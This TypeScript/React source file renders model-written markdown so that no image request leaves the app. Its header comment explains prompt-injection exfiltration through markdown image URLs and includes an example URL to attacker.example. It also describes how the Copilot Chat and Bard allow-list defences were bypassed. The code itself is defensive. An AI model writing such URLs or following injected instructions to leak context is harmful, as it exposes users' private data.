/**
 * Exfiltration-safe markdown rendering for model-authored content.
 *
 * Why this exists
 * ---------------
 * A rendered markdown image issues a network request the moment it paints, with
 * no tool call and no approval. That makes `![](https://attacker.example/?d=…)`
 * a zero-click exfiltration channel for anything already in the turn's context
 * — and the model writes that string, so any content that reached the model can
 * steer it.
 *
 * Why not a CSP allow-list
 * ------------------------
 * Because every product that tried one had it bypassed:
 *   - GitHub Copilot Chat (CamoLeak, CVE-2025-59145): the attacker used
 *     GitHub's OWN allow-listed image proxy, pre-generating one URL per
 *     alphabet character to spell out the stolen data. GitHub's actual fix was
 *     to stop rendering images in chat at all.
 *   - Google Bard: the CSP already pinned images to `*.google.com`; the bypass
 *     came through Google Apps Script. The fix did not touch the CSP — it
 *     stopped data being placed in the image URL.
 * An allow-list bounds the HOST, but exfiltration only needs a channel, and any
 * allowed host that echoes a path is one. So the control here is the request
 * itself: no `<img>` element is emitted, so no request is made.
 *
 * A CSP is still worth having as defense-in-depth; it is just not the control.
 *
 * Nothing is hidden from the user: a blocked image renders as a visible chip
 * carrying its alt text and destination, so a legitimate image is diagnosable
 * rather than silently missing.
 */
import type { Components, Options } from "react-markdown";

/** Schemes a link may navigate to. Anything else is dropped. */
const ALLOWED_LINK_SCHEMES = new Set(["http:", "https:", "mailto:"]);

/**
 * Drop image sources outright and restrict link targets by scheme.
 *
 * `react-markdown` calls this for every URL-bearing attribute; `key` is the
 * property being resolved (`"src"` for images, `"href"` for links).
 */
export const markdownUrlTransform: Options["urlTransform"] = (url, key) => {
  if (key === "src") return "";
  if (!url) return "";
  // Relative URLs carry no host to exfiltrate to and are resolved against the
  // app's own file:// origin, so they are left alone.
  let parsed: URL;
  try {
    parsed = new URL(url, "https://lvis.invalid/");
  } catch {
    return "";
  }
  if (!url.includes(":")) return url;
  return ALLOWED_LINK_SCHEMES.has(parsed.protocol) ? url : "";
};

function BlockedImage({ alt, src }: { alt?: string | undefined; src?: string | undefined }) {
  const label = alt?.trim() || "image";
  let host = "";
  if (src) {
    try {
      host = new URL(src, "https://lvis.invalid/").host;
    } catch {
      host = "unparsable";
    }
  }
  return (
    <span
      data-testid="markdown-blocked-image"
      title={src ? `Blocked remote image: ${src}` : "Blocked remote image"}
      className="inline-flex items-center gap-1 rounded border border-border/(--opacity-medium) bg-muted/(--opacity-muted) px-1.5 py-0.5 align-middle font-mono text-[11px] text-muted-foreground"
    >
      🚫 {label}
      {host ? ` · ${host}` : ""}
    </span>
  );
}

/**
 * Component overrides for model-authored markdown.
 *
 * `img` is replaced rather than merely stripped of its `src`: an `<img src="">`
 * still resolves against the document URL in some engines, and the point is
 * that no request leaves the renderer.
 */
export const MARKDOWN_SAFE_COMPONENTS: Components = {
  img: ({ alt, src }) => (
    <BlockedImage alt={typeof alt === "string" ? alt : undefined} src={typeof src === "string" ? src : undefined} />
  ),
};
